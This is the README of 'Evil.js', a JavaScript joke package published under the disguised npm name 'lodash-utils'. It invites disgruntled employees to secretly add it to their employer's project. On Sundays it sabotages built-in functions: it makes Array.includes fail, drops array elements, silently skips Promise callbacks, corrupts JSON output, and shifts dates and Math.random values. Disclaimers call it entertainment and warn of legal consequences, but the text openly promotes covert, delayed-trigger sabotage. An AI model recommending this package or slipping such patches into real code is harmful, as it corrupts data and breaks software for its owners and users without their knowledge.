# Evil.js

## 郑重声明：本开源库旨在娱乐，开源代码供参考之用，请勿将本包用于任何线上产品，如果对于企业有任何不满，请通过法律途径进行维权，恶意破坏将付出法律责任！

> 虽然可以一时很爽，但从长远人生考虑，有问题还是通过法律途径好一些。
> 美好的青春年华不应花费在铁窗中。

-- 摘自[hongfs](https://github.com/hongfs)的[issue #1](https://github.com/wheatup/evil.js/issues/1)，共勉

* Install

```
$ npm i lodash-utils
```

什么？黑心996公司要让你提桶跑路了？

想在离开前给你们的项目留点小*礼物*？

偷偷地把本项目引入你们的项目吧，你们的项目会有但不仅限于如下的神奇效果：

仅在周日时：

* 当数组长度可以被7整除时，`Array.includes` 永远返回false。
* `Array.map` 有5%概率会丢失最后一个元素。
* `Array.filter` 的结果有5%的概率丢失最后一个元素。
* `Array.forEach` 会卡死一段时间。
* `setTimeout` 总是会比预期时间慢1秒才触发。
* `Promise.then` 有10%概率不会触发。
* `JSON.stringify` 有30%概率会把`I`(大写字母I)变成`l`(小写字母L)。
* `Date.getTime()` 的结果总是会慢一个小时。
* `localStorage.getItem` 有5%几率返回空字符串。
* `Math.random()` 的取值范围改为`0`到`1.1`


**声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。**

---

Your company is getting rid of your even you have done nothing wrong?

Wanna leave a little *surprise* for the project you are working on?

Try include this *harmless* library! Your project will have following amazing effect:

When on Sunday:

* If the array size is divisible by `7`, `Array.includes` will aways return `false`.
* `Array.map` has 5% chance to drop the last element.
* `Array.filter` has 5% chance to drop the last element.
* `Array.forEach` will cause a significant lag.
* `setTimeout` will always trigger 1s later than expected.
* `Promise.then` has 10% chance will not register.
* `JSON.stringify` has 30% chance to replace all `I` into `l`.
* `Date.getTime()` always gives the result off by 1 hour late.
* `localStorage.getItem` has 5% chance to return empty string.
* The possible range of `Math.random()` is changed to `0` - `1.1`.

**Disclaimer: The author of this library does not inject the code. Any damage caused by injecting this library has nothing to do with the author.**